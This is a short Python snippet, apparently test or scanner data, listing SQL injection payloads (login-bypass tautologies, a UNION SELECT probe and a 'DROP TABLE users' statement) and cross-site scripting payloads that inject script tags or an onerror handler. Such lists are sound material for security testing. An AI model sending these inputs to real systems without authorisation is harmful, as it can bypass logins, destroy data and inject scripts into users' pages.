# SQL Injection payloads
SQLI_PAYLOADS = [
    "' OR 1=1 --",
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT NULL, NULL --",
]


# XSS payloads
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
]
